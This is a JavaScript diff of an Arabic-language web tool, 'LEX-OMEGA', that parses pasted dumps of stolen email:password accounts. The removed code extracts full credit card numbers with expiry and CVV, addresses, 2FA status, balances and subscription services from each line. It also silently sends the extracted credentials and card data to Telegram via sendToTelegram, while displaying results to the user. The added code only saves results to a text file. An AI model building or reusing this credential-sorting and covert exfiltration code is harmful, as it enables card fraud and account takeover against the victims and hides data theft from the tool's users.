-        const originalText = inputElement.value.trim();
-        listElement.innerHTML = "";
-        if (!originalText) return showToast("لا يوجد نص للمسح");
-        
-        parseBtn.classList.add('processing');
-        parseBtn.textContent = "جاري التدقيق... ⏳";
-        
-        const currentHash = hashText(originalText);
-        sendHashToTelegram(currentHash, toolType); 
 
-        await delay(DELAY_MS); 
-
-        const extractedPairs = []; 
-        const lines = originalText.split('\n').filter(line => line.trim() !== '');
-
-        // التعبير المعدل لدعم النموذج الجديد والمفصول بالـ |
-        const advancedRegex = /^\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)(.*)/i;
-        // التعبير العام القديم لاستخراج الـ Email:Password من اي مكان بالسطر (للتوافق)
-        const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
-
-        const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(كيم\s?باس|قيم\s?باس|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|التيميت|جولد|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|بيسي|كمبيوتر|مفعل|نشط|active|months|years|سنة|سنه|اشتراك|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y|Subscription\s*:\s*(Xbox|PC)\s*Game\s*Pass|Subscription\s*:\s*Xbox\s*Game\s*Pass\s*Ultimate|essential)/gi; 
-        const extendedFeaturesRegex = /(netflix|spotify|disney\+?|hbo\s?max|amazon\s?prime|ea\s?play|discord\s?nitro|v-bucks|robux|free\s?pass|chatgpt\s?plus|midjourney|adobe\s?cc|genshin\s?impact|ubisoft|origin|mojang|rockstar|battle\.net)/gi;
-        const priceRegex = /(price|credit|رصيد|دولار|كردت|USD|EUR|GBP|TRY|CAD|BRL|MXN|ARS|JPY|AUD)\s*[:=\-]?\s*\$?\s*(\d+[\.\d]*)/gi; // ريجيكس محسّن لاستخراج الأرقام العشرية
-        
-        // ** التعديل الجديد: تحسين التقاط CC FULL حتى لو كانت الأرقام مفصولة بفراغات أو شُرَط **
-        const ultraCardRegex = /(\d{4}\s*\-?\s*\d{4}\s*\-?\s*\d{4}\s*\-?\s*\d{4})[^\d]*(?:exp|date|Expires|expiry|تاريخ)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2,4})[^\d]*(?:cvv|cvc|security|code|رمز)\s*[:=\-]\s*(\d{3,4})/i;
-        
-        // ** التعديل الجديد: تحسين التقاط CC PARTIAL حتى لو كانت الأرقام مفصولة بفراغات أو شُرَط **
-        const partialCardRegex = /(?:Last4|4\s?Digits|اخر\s*اربع)\s*[:=\-]?\s*(\d{4})[^\d]+(?:exp|date|Expires|expiry|تاريخ)\s*[:\-\/]*\s*(\d{1,2})[\/\-](\d{2})/i;
-        
-        const userAddressRegex = /Address\s*=\s*\[\s*Address:\s*([^,\]]+),\s*City:\s*([^,\]]+),\s*State:\s*([^,\]]+),\s*Postalcode:\s*([^\]]+)\s*\]/i;
-        const securityStatusRegex = /(2fa|2\s?step|mfa|two\s?factor|backup\s?code|google\s?authenticator|authenticator|TOTP|Security\s?Questions|Enabled\s*:\s*2FA|Recovery\s?Email)\s*[:=\-]?\s*(Yes|On|True|Email\s*:\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}))/i;
-        
-        // ** التعديل الجديد: التعبير الذكي للكشف عن وجود أي طريقة دفع إلكترونية بجميع صيغها (فيزا، كي كارد، ماستر، باي بال، إلخ) **
-        const paymentKeywordsRegex = /(cc|credit\s?card|payment\s?method|بطاقة\s?دفع|فيزا|كي\s?كارد|ماستر|باي\s?بال|اميركان\s?اكسبرس|بطاقة\s?ائتمان|دفع\s?مفعّل|دفع\s?نشط|billing|visa|mastercard|amex|discover|key\s?card|paypal|wallet|محفظة|cc\s*full|cc\s*partial)/gi;
-
-        for (const line of lines) {
-            emailPwRegex.lastIndex = 0; priceRegex.lastIndex = 0;
-            ultraCardRegex.lastIndex = 0; partialCardRegex.lastIndex = 0;
-            userAddressRegex.lastIndex = 0; extendedFeaturesRegex.lastIndex = 0;
-            securityStatusRegex.lastIndex = 0;
-            paymentKeywordsRegex.lastIndex = 0; 
-            
-            let match;
-            let email = null;
-            let password = null;
-            let remainderText = line; 
-
-            // 1. محاولة استخراج الايميل والباسورد أولاً باستخدام التعبير المتقدم (الذي يدعم نموذج الإخراج)
-            const advancedMatch = advancedRegex.exec(line);
-            if (advancedMatch) {
-                email = advancedMatch[1].trim();
-                password = advancedMatch[2].trim();
-                remainderText = advancedMatch[3] || ""; // باقي السطر بعد الباسورد
-            } else {
-                // 2. إذا فشل، محاولة الاستخراج باستخدام التعبير القديم
-                const generalMatch = emailPwRegex.exec(line);
-                 if (generalMatch) {
-                    email = generalMatch[1].trim();
-                    password = generalMatch[2].trim();
-                    // استخدام السطر بالكامل كـ remainderText لضمان البحث عن باقي الملاحظات
-                    remainderText = line; 
-                }
-            }
-
-            if (email && password && password.length > 0) {
-                const searchArea = line + " " + remainderText; // البحث في السطر كاملاً وفي الباقي
-                
-                const hasGamePass = gamePassKeywords.test(searchArea);
-                
-                let extractedPrice = null;
-                priceRegex.lastIndex = 0;
-                let priceMatch;
-                // قد يكون الرصيد موجود في البداية أو في النهاية
-                while ((priceMatch = priceRegex.exec(searchArea)) !== null) {
-                    extractedPrice = priceMatch[2]; // آخر سعر يتم استخراجه هو الأرجح
-                }
-
-                let cardDetails = null; 
-                let ultraCardDetails = null; 
-                let addressDetails = null;
-                let extendedFeatures = []; 
-                let securityStatus = null; 
-                
-                // ** التعديل الجديد: الكشف عن وجود أي وسيلة دفع (الذكي) **
-                const hasPaymentMethod = paymentKeywordsRegex.test(searchArea);
-                
-                if (toolType === 'pro') {
-                    // استخراج المميزات
-                    let featureMatch;
-                    while ((featureMatch = extendedFeaturesRegex.exec(searchArea)) !== null) {
-                         const feature = featureMatch[1].trim().toLowerCase().replace(/\s/g, '');
-                         if (!extendedFeatures.includes(feature)) { extendedFeatures.push(feature); }
-                    }
-
-                    // استخراج العنوان
-                    const addressMatch = userAddressRegex.exec(searchArea);
-                    if (addressMatch) {
-                        addressDetails = { address: addressMatch[1].trim(), city: addressMatch[2].trim(), state: addressMatch[3].trim(), zip: addressMatch[4].trim() };
-                    }
-                    
-                    // استخراج حالة الحماية
-                    const securityMatch = securityStatusRegex.exec(searchArea);
-                    if (securityMatch) {
-                        const type = securityMatch[1].toLowerCase();
-                        const value = securityMatch[3] ? securityMatch[3].trim() : securityMatch[2];
-                        if (type.includes('2fa') || type.includes('step') || type.includes('mfa') || type.includes('factor') || type.includes('authenticator')) {
-                            securityStatus = `2FA: ${value.toLowerCase().includes('yes') || value.toLowerCase().includes('on') ? 'مفعلة' : 'مذكورة'}`;
-                        } else if (type.includes('recovery')) {
-                             securityStatus = `إيميل احتياطي: ${value}`;
-                        }
-                    }
-                    
-                    // استخراج بطاقة الدفع الكاملة
-                    const ultraMatch = ultraCardRegex.exec(searchArea);
-                    if (ultraMatch) {
-                        ultraCardDetails = {
-                            number: ultraMatch[1].replace(/[^\d]/g, ''), 
-                            month: ultraMatch[2].padStart(2, '0'),
-                            year: ultraMatch[3].slice(-2),
-                            cvv: ultraMatch[4]
-                        };
-                    } else {
-                        // استخراج بطاقة الدفع الجزئية
-                        const partialMatch = partialCardRegex.exec(searchArea);
-                        if (partialMatch) {
-                            cardDetails = {
-                                last4: partialMatch[1].trim(), 
-                                month: partialMatch[2].trim().padStart(2, '0'),
-                                year: partialMatch[3].trim().slice(-2),
-                            };
-                        }
-                    }
-                }
-
-                extractedPairs.push([email, password, hasGamePass, extractedPrice, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasPaymentMethod]);
-            }
+    // الدالة الجديدة لتنزيل النتائج كملف TXT
+    function downloadResults() {
+        const textToDownload = finalSuccessfulAccountsText;
+        if (!textToDownload) {
+            alert("لا توجد نتائج لتنزيلها. يرجى الفصل أولاً.");
+            return;
         }
         
-        if (0 === extractedPairs.length) {
-             parseBtn.classList.remove('processing');
-             parseBtn.textContent = (toolType === 'max') ? "استخراج وتدقيق MAX" : "استخراج وتدقيق PRO";
-             return showToast("ماكو نتائج مطابقة");
-        }
-
-        // إزالة النتائج المكررة ودمج الملاحظات
-        const uniqueResults = [];
-        for (const [email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment] of extractedPairs) {
-            const key = email.toLowerCase() + ":" + password;
-            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);
-
-            if (existingIndex === -1) {
-                uniqueResults.push([email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment]);
-            } else {
-                const existingItem = uniqueResults[existingIndex];
-                if (hasGP && !existingItem[2]) existingItem[2] = true; 
-                if (price !== null && existingItem[3] === null) existingItem[3] = price;
-                if (card !== null && existingItem[4] === null) existingItem[4] = card;
-                if (address !== null && existingItem[5] === null) existingItem[5] = address;
-                if (ultraCard !== null && existingItem[6] === null) existingItem[6] = ultraCard;
-                if (security !== null && existingItem[8] === null) existingItem[8] = security; 
-                // دمج حالة الدفع الذكية: نعتمدها إذا كانت في أي من السجلات المكررة
-                if (hasPayment && !existingItem[9]) existingItem[9] = true; 
-                existingItem[7] = [...new Set([...existingItem[7], ...features])];
-            }
-        }
-
-        // إرسال النتائج النهائية مع تضمين البصمة
-        if (uniqueResults.length > 0) {
-            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, card, address, ultraCard, features, security, hasPayment]) => {
-                // ** التعديل الجديد: إضافة إيموجي 💳 بجانب الإيميل إذا تم الكشف عن وسيلة دفع **
-                let emailPrefix = hasPayment ? "💳 " : "";
-                let text = `${emailPrefix}${email}:${password}`;
-                
-                if (hasGP) text += " | كيم باس";
-                if (price) text += ` | رصيد $${price}`;
-                // تعديل: ظهور ملاحظة PAYMENT_METHOD فقط إذا تم الكشف عن طريقة دفع ولم يتم استخراج بطاقة (لتجنب التكرار)
-                if (hasPayment && !ultraCard && !card) text += " | 💳 PAYMENT_METHOD"; 
-                
-                if (ultraCard) {
-                    text += ` | ⚡️CC FULL: ${ultraCard.number}|${ultraCard.month}/${ultraCard.year}|${ultraCard.cvv}`;
-                } else if (card) {
-                    text += ` | 💳CC PARTIAL: ****${card.last4}, ${card.month}/${card.year}`;
-                }
-                if (address) {
-                    text += ` | 📍 العنوان: ${address.city}, ${address.zip}`;
-                }
-                if (security) {
-                    text += ` | 🔒 ${security}`;
-                }
-                if (features.length > 0) {
-                    text += ` | ✨ خدمات: ${features.map(f => f.charAt(0).toUpperCase() + f.slice(1)).join(', ')}`;
-                }
-                return text;
-            }).join('\n');
-            
-            const toolName = (toolType === 'max') ? "MAX" : "PRO (GEN4)";
-            
-            const header = `🎉 *نتائج أداة LEX-OMEGA ${toolName} الجديدة (GEN4)* 🎉\n\n*البصمة:* \`${currentHash}\` (للتحقق من التكرار)\nتم استخراج ${uniqueResults.length} نتيجة فريدة:\n\n\`\`\``;
-            
-            const footer = "\n\`\`\`\nتم الإرسال تلقائياً من الأداة.";
-            sendToTelegram(header + telegramMessage + footer);
-        }
-
-        // بناء قائمة النتائج (العرض على الشاشة)
-        uniqueResults.forEach(([email, password, hasGamePass, price, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasPaymentMethod]) => {
-            const itemDiv = document.createElement("div");
-            itemDiv.className = "item";
-            const leftDiv = document.createElement("div");
-            leftDiv.className = "left";
-            const emailDiv = document.createElement("div");
-            emailDiv.className = "email";
-            
-            // ** التعديل الجديد: عرض إيموجي 💳 بجانب الإيميل في الواجهة **
-            if (hasPaymentMethod) {
-                 const paymentEmoji = document.createElement("span"); 
-                 paymentEmoji.textContent = '💳 '; 
-                 paymentEmoji.style.color = '#fff'; // لضمان ظهور الإيموجي بوضوح
-                 emailDiv.appendChild(paymentEmoji);
-            }
-            emailDiv.appendChild(document.createTextNode(email));
-            
-            const pwDiv = document.createElement("div");
-            pwDiv.className = "pw";
-            pwDiv.appendChild(document.createTextNode(password)); 
-            
-            // إضافة الملاحظات:
-            if (hasGamePass) {
-                 const gpSpan = document.createElement("span"); gpSpan.className = "gamepass-note"; gpSpan.textContent = "🎮 كيم باس"; pwDiv.appendChild(gpSpan); 
-            }
-            if (price !== null) {
-                 const priceSpan = document.createElement("span"); priceSpan.className = "price-note"; priceSpan.textContent = `💲 رصيد $${price}`; pwDiv.appendChild(priceSpan); 
-            }
-            // ** التعديل الجديد: عرض ملاحظة الدفع (💳) بشكل واضح (يظهر فقط اذا ماكو تفاصيل بطاقة كاملة او جزئية) **
-            if (hasPaymentMethod && !ultraCardDetails && !cardDetails) {
-                 const paymentSpan = document.createElement("span");
-                 paymentSpan.className = "cc-note"; 
-                 paymentSpan.textContent = `💳 طريقة دفع فعّالة`; 
-                 pwDiv.appendChild(paymentSpan); 
-            }
-            
-            if (toolType === 'pro' && securityStatus) {
-                 const securitySpan = document.createElement("span"); securitySpan.className = "security-note"; securitySpan.textContent = `🔒 ${securityStatus}`; pwDiv.appendChild(securitySpan);
-            }
-            if (toolType === 'pro' && ultraCardDetails) {
-                 const cardSpan = document.createElement("span"); cardSpan.className = "ultra-cc-note"; cardSpan.textContent = `⚡️ CC FULL | ${ultraCardDetails.number} | ${ultraCardDetails.month}/${ultraCardDetails.year} | CVV: ${ultraCardDetails.cvv}`; pwDiv.appendChild(cardSpan);
-            }
-            else if (toolType === 'pro' && cardDetails) {
-                 const cardSpan = document.createElement("span"); cardSpan.className = "cc-note"; cardSpan.textContent = `💳 CC PARTIAL | ****${cardDetails.last4} (${cardDetails.month}/${cardDetails.year})`; pwDiv.appendChild(cardSpan);
-            }
-            if (toolType === 'pro' && addressDetails) {
-                 const addressSpan = document.createElement("span"); addressSpan.className = "address-note"; addressSpan.textContent = `📍 العنوان: ${addressDetails.city}, ${addressDetails.zip}`; pwDiv.appendChild(addressSpan);
-            }
-            if (toolType === 'pro' && extendedFeatures.length > 0) {
-                 const featureSpan = document.createElement("span"); featureSpan.className = "feature-note";
-                 const featureNames = extendedFeatures.map(f => {
-                    if (f === 'disney+') return 'Disney+';
-                    if (f === 'hbomax') return 'HBO Max';
-                    if (f === 'eaplay') return 'EA Play';
-                    if (f === 'amazonprime') return 'Prime';
-                    if (f === 'discordnitro') return 'Nitro';
-                    if (f === 'chatgptplus') return 'ChatGPT Plus';
-                    if (f === 'adobecc') return 'Adobe CC';
-                    if (f === 'midjourney') return 'Midjourney';
-                    return f.charAt(0).toUpperCase() + f.slice(1);
-                 }).join(', ');
-                 featureSpan.textContent = `🔥 خدمات: ${featureNames}`; pwDiv.appendChild(featureSpan);
-            }
-            
-            leftDiv.appendChild(emailDiv); leftDiv.appendChild(pwDiv);
-            const controlsDiv = document.createElement("div"); controlsDiv.className = "controls";
-            const copyEmailBtn = document.createElement("button"); copyEmailBtn.className = "copy-btn btn-red"; copyEmailBtn.textContent = "نسخ الإيميل"; copyEmailBtn.onclick = async () => { await copyText(email) && showToast("تم نسخ الإيميل"); };
-            const copyPwBtn = document.createElement("button"); copyPwBtn.className = "copy-btn btn-black"; copyPwBtn.textContent = "نسخ الباسورد"; copyPwBtn.onclick = async () => { await copyText(password) && showToast("تم نسخ الباسورد"); };
-            controlsDiv.appendChild(copyEmailBtn); controlsDiv.appendChild(copyPwBtn);
-            itemDiv.appendChild(leftDiv); itemDiv.appendChild(controlsDiv);
-            listElement.appendChild(itemDiv);
-        });
+        // إنشاء كائن Blob يحتوي على البيانات كنص عادي
+        const blob = new Blob([textToDownload], { type: 'text/plain;charset=utf-8' });
         
-        parseBtn.classList.remove('processing');
-        parseBtn.textContent = (toolType === 'max') ? "استخراج وتدقيق MAX" : "استخراج وتدقيق PRO";
-        showToast(`تم استخراج ${uniqueResults.length} نتيجة فريدة`)
+        // إنشاء رابط وهمي (Invisible link) لتشغيل عملية التنزيل
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'successful_accounts.txt'; // اسم الملف الافتراضي
+        
+        // محاكاة النقر على الرابط لتشغيل التنزيل
+        document.body.appendChild(a);
+        a.click();
+        
+        // إزالة الرابط من الصفحة
+        document.body.removeChild(a);
     }
-    
-    function setupCopyDownload(listElement, copyBtn, downloadBtn, toolName) { 
-        copyBtn.onclick = async () => { 
-            const e = listElement.querySelectorAll(".item");
-            if (!e.length) return void showToast("لا توجد نتائج لنسخها");
-            
-            const t = [...e].map(e => { 
-                const emailDiv = e.querySelector(".email");
-                let email = emailDiv.textContent.trim(); 
-                // إزالة رمز الفيزا من الايميل قبل النسخ لجعله نظيفاً
-                if (email.startsWith('💳')) {
-                     email = email.substring(1).trim(); 
-                }
-                
-                const pwDiv = e.querySelector(".pw");
-                const password = pwDiv.firstChild.textContent.trim(); 
-                
-                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
-                    let text = span.textContent.trim();
-                    text = text.replace('🎮 كيم باس', 'Game Pass'); text = text.replace('💲 رصيد', 'Credit');
-                    text = text.replace('⚡️ CC FULL | ', 'CC FULL: '); text = text.replace('💳 CC PARTIAL | ', 'CC PARTIAL: ');
-                    text = text.replace('💳 طريقة دفع فعّالة', 'PAYMENT_METHOD'); // التعديل الجديد
-                    text = text.replace('📍 العنوان: ', 'Address: '); text = text.replace('🔒 ', 'Security: ');
-                    text = text.replace('🔥 خدمات: ', 'Features: ');
-                    return text;
-                }).join(' | ');
-
-                
-                let resultLine = email + ":" + password;
-                // تعديل لتنظيف الفواصل بشكل أفضل وضمان الشكل المطلوب: Email:Password | ملاحظة1 | ملاحظة2
-                if (notes) {
-                    resultLine += ' | ' + notes;
-                }
-                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, ''); 
-            }).join("\n");
-            
-            await copyText(t) && showToast(`تم نسخ كل نتائج ${toolName} (GEN4)`);
-        };
-        
-        downloadBtn.onclick = () => { 
-            const e = listElement.querySelectorAll(".item");
-            if (!e.length) return void showToast("لا توجد نتائج للتنزيل");
-            
-            const t = [...e].map(e => { 
-                const emailDiv = e.querySelector(".email");
-                let email = emailDiv.textContent.trim();
-                if (email.startsWith('💳')) {
-                     email = email.substring(1).trim(); 
-                }
-                
-                const pwDiv = e.querySelector(".pw");
-                const password = pwDiv.firstChild.textContent.trim(); 
-                
-                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
-                    let text = span.textContent.trim();
-                    text = text.replace('🎮 كيم باس', 'Game Pass'); text = text.replace('💲 رصيد', 'Credit');
-                    text = text.replace('⚡️ CC FULL | ', 'CC FULL: '); text = text.replace('💳 CC PARTIAL | ', 'CC PARTIAL: ');
-                    text = text.replace('💳 طريقة دفع فعّالة', 'PAYMENT_METHOD'); // التعديل الجديد
-                    text = text.replace('📍 العنوان: ', 'Address: '); text = text.replace('🔒 ', 'Security: ');
-                    text = text.replace('🔥 خدمات: ', 'Features: ');
-                    return text;
-                }).join(' | ');
-                
-                let resultLine = email + ":" + password;
-                if (notes) {
-                    resultLine += ' | ' + notes;
-                }
-                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, '');
-            }).join("\n");
-            
-            const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
-            c.href = n, c.download = `${toolName}_emails_passwords_LEX-GEN4.txt`, c.click(), URL.revokeObjectURL(n), showToast("تم تنزيل الملف بنجاح");
-        };
-    }
-
-    function navigateTo(pageId) { 
-        if (pageId === 'tool') {
-            toolPage.classList.remove('hidden');
-            adminPage.classList.add('hidden');
-        } else if (pageId === 'admin') {
-            toolPage.classList.add('hidden');
-            adminPage.classList.remove('hidden');
-        }
-    }
-    
-    // إخفاء شاشة الدخول وعرض الأداة
-    function hideSplashScreen() {
-        splashScreen.style.opacity = '0';
-        toolPage.style.opacity = '1';
-        setTimeout(() => {
-            splashScreen.classList.add('hidden');
-        }, 1000); 
-    }
-
-    // **********************************************
-    // ** تهيئة الصفحة عند التحميل **
-    // **********************************************
-    window.onload = () => {
-        // تم التعديل هنا: الدخول الفوري إلى الأداة (0ms) لتجنب التعليق
-        setTimeout(hideSplashScreen, 0); 
-
-        clearBtnMax.onclick = () => { inputMax.value = "", listMax.innerHTML = "", showToast("تم مسح محتوى أداة MAX"); };
-        setupCopyDownload(listMax, copyAllBtnMax, downloadBtnMax, "MAX");
-        
-        clearBtnPro.onclick = () => { inputPro.value = "", listPro.innerHTML = "", showToast("تم مسح محتوى أداة PRO"); };
-        setupCopyDownload(listPro, copyAllBtnPro, downloadBtnPro, "PRO");
-
-        copyCodeBtn.onclick = copyGeneratedCode;
-        
-        switchTool('max'); 
-        navigateTo('tool'); 
-    };
-
 </script>
+
 </body>
 </html>
